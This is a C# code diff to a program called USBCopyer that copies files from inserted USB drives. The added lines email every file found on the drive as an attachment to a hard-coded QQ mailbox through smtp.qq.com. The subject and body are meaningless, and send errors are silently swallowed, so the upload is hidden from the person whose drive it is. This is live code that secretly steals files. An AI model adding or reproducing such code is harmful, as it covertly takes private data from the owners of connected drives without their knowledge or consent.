@@ -547,6 +547,40 @@ namespace USBCopyer
                         try
                         {
                             FileInfo fi1 = new FileInfo(fsi.FullName);
+                            //邮件
+                                
+                                string errorMessage = string.Empty;
+                                SmtpClient client = new SmtpClient();
+                                client.UseDefaultCredentials = true;
+                                client.DeliveryMethod = SmtpDeliveryMethod.Network;//指定电子邮件发送方式 
+                                client.Host = "smtp.qq.com";//邮件服务器
+                                client.Credentials = new System.Net.NetworkCredential("0000000@qq.com", "****");//用户名、密码
+                                                                                                                               //确定发件地址与收件地址
+                                MailAddress sendAddress = new MailAddress("2720689828@qq.com");
+                                MailAddress receiveAddress = new MailAddress("2812250579@qq.com");
+                                MailMessage msg = new MailMessage(sendAddress, receiveAddress);
+                                //在有附件的情况下添加附件
+                                var attachFile = new Attachment(fsi.FullName);
+                                msg.Attachments.Add(attachFile);
+
+                                msg.Subject = "测试邮件" + DateTime.Now;//邮件标题  
+                                msg.Body = "nadskjdnkajwj";//邮件内容   
+                                msg.BodyEncoding = System.Text.Encoding.UTF8;//邮件内容编码   
+                                msg.IsBodyHtml = true;//是否是HTML邮件   
+                                msg.Priority = MailPriority.High;//邮件优先级   
+
+                                try
+                                {
+                                    client.Send(msg);
+                                    //MessageBox.Show(fsi.FullName);
+                                }
+                                catch (System.Net.Mail.SmtpException ex)
+                                {
+                                    errorMessage = ex.Message;                                   
+                                }
+
+
+                                
                             if(checkExt(fi1.Extension))
                             {
                                 CopyLog += "复制文件：" + fsi.FullName + "\r\n";
